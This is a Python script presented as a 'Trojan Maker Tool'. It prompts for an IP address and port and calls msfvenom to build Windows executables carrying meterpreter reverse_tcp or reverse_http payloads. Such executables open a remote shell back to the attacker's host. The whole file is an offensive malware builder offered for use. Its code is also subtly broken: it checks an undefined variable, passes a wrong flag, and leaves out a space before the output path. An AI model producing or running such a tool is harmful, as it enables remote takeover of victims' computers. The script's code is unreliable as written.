#!/usr/bin/env python

import os
import time
from colorama import Fore, Back, Style

banner = """ ▄▀▀▄  ▄▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▄ 
█    █   █ ▐ ▄▀ ▀▄ █  █ █ █ 
▐     ▀▄▀    █▄▄▄█ ▐  █  ▀█ 
     ▄▀ █   ▄▀   █   █   █  
    █  ▄▀  █   ▄▀  ▄▀   █   
  ▄▀  ▄▀   ▐   ▐   █    ▐   
 █    ▐            ▐        """

print(Fore.LIGHTMAGENTA_EX + banner)
time.sleep(1.5)

print(Fore.LIGHTCYAN_EX + 
"""
[!] Trojan Maker Tool By Lexa
""")
os.system("clear")

ip = input("Enter local or open IP: ")
port = input("Enter Port: ")

print(Fore.LIGHTCYAN_EX + """

[1] windows/meterpreter/reverse_tcp
[2] windows/meterpreter/reverse_http

""")

payloadno = input("Enter Payload No: ")
logtarget = input("Enter log target (File Location): ")

if(payload == "1"):
    os.system("msfvenom -P windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o" + logtarget)
elif(payload == "2"):
    os.system("msfvenom -P windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o" + logtarget)